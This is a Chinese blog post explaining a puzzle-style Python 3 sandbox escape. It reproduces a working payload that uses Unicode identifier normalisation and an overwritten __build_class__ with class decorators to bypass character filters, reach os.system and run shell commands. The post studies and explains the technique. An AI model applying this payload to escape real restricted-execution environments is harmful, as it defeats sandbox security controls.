<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>Python3的一个沙箱逃逸技巧 | debug.cool</title><meta name="description" content="Emil Lerner(twitter @emil_lerner) 上个月发了个推，当时看到了没想到很好的解决方法。"><meta property="og:type" content="article"><meta property="og:title" content="Python3的一个沙箱逃逸技巧"><meta property="og:url" content="http://debug.cool/2021/04/01/sandboxEscapePy3/index.html"><meta property="og:site_name" content="Kirk"><meta property="og:description" content="Emil Lerner(twitter @emil_lerner) 上个月发了个推，当时看到了没想到很好的解决方法。"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2021-03-31T16:10:00.000Z"><meta property="article:modified_time" content="2021-05-13T08:25:37.113Z"><meta property="article:author" content="ClanceyHuang"><meta property="article:tag" content="debug"><meta name="twitter:card" content="summary"><link rel="canonical" href="http://debug.cool/2021/04/01/sandboxEscapePy3/index.html"><link rel="alternate" href="/atom.xml" title="Kirk" type="application/atom+xml"><link rel="icon" href="/avatar.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-vs.css" type="text/css"></head><body class="main-center" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="/" target="_blank"><img class="img-circle img-rotate" src="/avatar.png" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">ClanceyHuang</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">Low Level Researcher</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shanghai, China</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form" method="GET" action="https://www.baidu.com/s?"><div class="input-group"><input name="wd" type="text" class="form-control search-form-input" placeholder="Search"> <span class="input-group-btn"><button type="submit" class="btn btn-flat search-form-submit"><i class="icon icon-search"></i></button></span></div></form></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">Home</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">Archives</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">Categories</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">Tags</span></a></li><li class="menu-item menu-item-repository"><a href="/repository"><i class="icon icon-project"></i> <span class="menu-title">Repository</span></a></li><li class="menu-item menu-item-links"><a href="/links"><i class="icon icon-friendship"></i> <span class="menu-title">Links</span></a></li><li class="menu-item menu-item-about"><a href="/about"><i class="icon icon-cup-fill"></i> <span class="menu-title">About</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/ClanceyHuang" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">Board</h3><div class="widget-body"><div id="board"><div class="content"><p>Think Twice Code Once.</p></div></div></div></div><div class="widget"><h3 class="widget-title">Tag Cloud</h3><div class="widget-body tagcloud"><a href="/tags/Kafka/" style="font-size:13px">Kafka</a> <a href="/tags/Matplotlib/" style="font-size:13px">Matplotlib</a></div></div><div class="widget"><h3 class="widget-title">Recent Posts</h3><div class="widget-body"><ul class="recent-post-list list-unstyled no-thumbnail"><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/sec/">sec</a></p><p class="item-title"><a href="/2021/04/01/sandboxEscapePy3/" class="title">Python3的一个沙箱逃逸技巧</a></p><p class="item-date"><time datetime="2021-03-31T16:10:00.000Z" itemprop="datePublished">2021-04-01</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/tips/">tips</a></p><p class="item-title"><a href="/2021/01/20/tipsWSL/" class="title">Windows10下WSL开发环境搭建</a></p><p class="item-date"><time datetime="2021-01-20T14:44:00.000Z" itemprop="datePublished">2021-01-20</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/dev/">dev</a></p><p class="item-title"><a href="/2020/12/09/devDiyExpress/" class="title">DiyExpress - 自定义表达式计算引擎</a></p><p class="item-date"><time datetime="2020-12-08T16:00:00.000Z" itemprop="datePublished">2020-12-09</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/tips/">tips</a></p><p class="item-title"><a href="/2020/03/15/tipsDoubleSystem/" class="title">Window10下双系统grub修复</a></p><p class="item-date"><time datetime="2020-03-15T15:10:00.000Z" itemprop="datePublished">2020-03-15</time></p></div></li><li><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/dev/">dev</a></p><p class="item-title"><a href="/2020/02/03/devDiyForm/" class="title">自定义表单设计及实现方案</a></p><p class="item-date"><time datetime="2020-02-03T06:30:00.000Z" itemprop="datePublished">2020-02-03</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">Catalogue</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#identifier-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">identifier 过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">函数调用绕过</span></a></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-sandboxEscapePy3" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">Python3的一个沙箱逃逸技巧</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2021/04/01/sandboxEscapePy3/" class="article-date"><time datetime="2021-03-31T16:10:00.000Z" itemprop="datePublished">2021-04-01</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/sec/">sec</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/04/01/sandboxEscapePy3/#comments" class="article-comment-link">Comments</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 783(words)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 3(minutes)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>Emil Lerner(twitter @emil_lerner) 上个月发了个<a target="_blank" rel="noopener" href="//twitter.com/emil_lerner/status/1369221697145016322">推</a>，当时看到了没想到很好的解决方法。</p><span id="more"></span><p>他提出了这样一个问题:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;hui&quot;\&#x27;(&#x27;</span>:</span><br><span class="line">    <span class="keyword">assert</span> c <span class="keyword">not</span> <span class="keyword">in</span> code</span><br><span class="line"><span class="built_in">exec</span>(code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;)</span><br></pre></td></tr></table></figure><p>3月15号的时候 Arthur Khashaev (twitter @Invizory)给了个<a target="_blank" rel="noopener" href="https://gist.github.com/Invizory/36b5c4e037548b940c831efe350162d2">解法</a>，惊为天人，来和大家分享一下。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b=[].__class__.__base__</span><br><span class="line">d=[].__doc__</span><br><span class="line">n=d.__doc__[<span class="number">31</span>]</span><br><span class="line">__bultns__[n+n+d[<span class="number">13</span>]+d[<span class="number">1</span>:<span class="number">4</span>]+d[<span class="number">139</span>]+n+d[<span class="number">23</span>]+d[<span class="number">3</span>]+d[<span class="number">12</span>]+d[<span class="number">17</span>]*<span class="number">2</span>+n+n]=<span class="keyword">lambda</span>*_:b</span><br><span class="line"><span class="meta">@b.__class__.__subclasses__</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span>:</span>_</span><br><span class="line"><span class="meta">@s[<span class="number">84</span>].load_module</span></span><br><span class="line"><span class="meta">@lambda _:d[<span class="number">32</span>]+d[<span class="number">17</span>]</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">o</span>:</span>_</span><br><span class="line"><span class="meta">@o.system</span></span><br><span class="line"><span class="meta">@lambda _:d[<span class="number">2</span>]+d[<span class="number">139</span>]</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_</span>:</span>_</span><br></pre></td></tr></table></figure><h2 id="identifier-过滤绕过"><a class="markdownIt-Anchor" href="#identifier-过滤绕过"></a> identifier 过滤绕过</h2><p>这段代码的第一个神奇之处就在于 python3 的 interpreter 竟然会做 unicode normalize，这个特性总<br>感觉以前从来没看过，经过一定的考证找到了<a target="_blank" rel="noopener" href="https://docs.python.org/3/reference/lexical_analysis.html#identifiers">实据</a>，文档中写到:</p><p><strong>Python 3.0 introduces additional characters from outside the ASCII range (see PEP 3131). For these characters, the classification uses the version of the Unicode Character Database as included in the unicodedata module.</strong></p><p>从 python 3.0 引入的对 name 的处理，从 <a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-3131/#implementation">PEP 3131</a> 中可知:</p><p><strong>The following changes will need to be made to the parser:</strong></p><p><strong>If a non-ASCII character is found in the UTF-8 representation of the source code, a forward scan is made to find the first ASCII non-identifier character (e.g. a space or punctuation character) The entire UTF-8 string is passed to a function to normalize the string to NFKC, and then verify that it follows the identifier syntax. No such callout is made for pure-ASCII identifiers, which continue to be parsed the way they are today. The Unicode database must start including the Other_ID_{Start|Continue} property. If this specification is implemented for 2.x, reflective libraries (such as pydoc) must be verified to continue to work when Unicode strings appear in <strong>dict</strong> slots as keys.</strong></p><p>具体来说就是如果 id 名称使用了非 ASCII 字符，则会将整个 name 传给 unicodedb 去做 NFKC normalize，也就是说这些字符会被自动的替换，从而正常解析。<br>因此 Python 3 起针对 identifier 的过滤都可以使用该方法绕过。</p><h2 id="函数调用绕过"><a class="markdownIt-Anchor" href="#函数调用绕过"></a> 函数调用绕过</h2><p>本题第二个难点在于，不允许使用左括号，因此无法做直接的函数调用。有同学就要说了，可以通过修 改 <strong>add</strong> 等默认行为来做间接的函数调用，不过我没有找到内置的可以直接修改 <strong>add</strong> 属性的 对象，若有发现望告知。<br>Arthur 使用的方法比较巧妙，通过修改 <strong>build_class</strong> 从而修改了声明 class 时的默认行为，</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__bultns__[n+n+d[<span class="number">13</span>]+d[<span class="number">1</span>:<span class="number">4</span>]+d[<span class="number">139</span>]+n+d[<span class="number">23</span>]+d[<span class="number">3</span>]+d[<span class="number">12</span>]+d[<span class="number">17</span>]*<span class="number">2</span>+n+n]=<span class="keyword">lambda</span>*_:b</span><br></pre></td></tr></table></figure><p>这一行将修改创建 class 时的默认行为，使得每个 class 声明都会返回 object type:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[<span class="string">&#x27;__build_class__&#x27;</span>] = <span class="keyword">lambda</span>*_:b</span><br></pre></td></tr></table></figure><p>而这里:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@b.__class__.__subclasses__ </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s</span>:</span>_</span><br></pre></td></tr></table></figure><p>在创建 class 的时候相当于让</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = b(func, name, /, *bases, [metaclass], **kwds) <span class="comment"># 即 s = object</span></span><br><span class="line">s = b.__class__.__subclasses__(s) <span class="comment"># 即 s = b.__class__.__subclasses__(object)</span></span><br></pre></td></tr></table></figure><p>从而通过 class s 获得了object的子类列表<br>后续原理类似不再赘述。这个形势有些类似于 PHP 中的回调型后⻔，对于 function 其实也有类似的形<br>势可以达到一样的效果:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@b.__class__.__subclasses__ </span></span><br><span class="line"><span class="meta">@c</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span>():</span> <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>因此值得讨论的问题转化为了: python 中的类似回调的行为都有哪些?</p></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>本文链接：</strong> <a href="http://debug.cool/2021/04/01/sandboxEscapePy3/" title="Python3的一个沙箱逃逸技巧" target="_blank" rel="external">http://debug.cool/2021/04/01/sandboxEscapePy3/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="/" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/avatar.png" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="/" target="_blank"><span class="text-dark">ClanceyHuang</span><small class="ml-1x">Low Level Researcher</small></a></h3><div>为人治学当有独立之精神，自由之思想。</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="next"><a href="/2021/01/20/tipsWSL/" title="Windows10下WSL开发环境搭建"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button"><span>[&nbsp;</span><span>Catalogue</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="weibo,qq,qzone,wechat,douban,diandian,facebook,twitter,google,linkedin" data-mobile-sites="weibo,qq,qzone,wechat,douban,facebook,twitter,linkedin"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/ClanceyHuang" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div class="copyright">&copy; 2021 ClanceyHuang<div class="publishby">Theme by <a href="https://github.com/cofess" target="_blank">cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.</div></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>!function(t){t(".search-form").on("submit",function(o){var n=t('.search-form-input[name="wd"]').val();return window.location="https://www.baidu.com/s?wd=site:debug.cool "+n,!1})}(jQuery)</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta=(meta="nick,mail,link").split(",").filter(function(e){return-1<GUEST.indexOf(e)});new Valine({el:"#vcomments",verify:!1,notify:!1,appId:"Qqm4Y42SKNlM4BvWNdr9qjwC-gzGzoHsz",appKey:"NeKHjEgYc95FxcuCX3dYtE30",placeholder:"Just go go",avatar:"mm",meta:meta,pageSize:"10",visitor:!1})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-104610957-2","auto"),ga("send","pageview")</script></body></html><script type="text/javascript" src="//cdn.jsdelivr.net/gh/ygbhf/clicklove/clicklove.js"></script>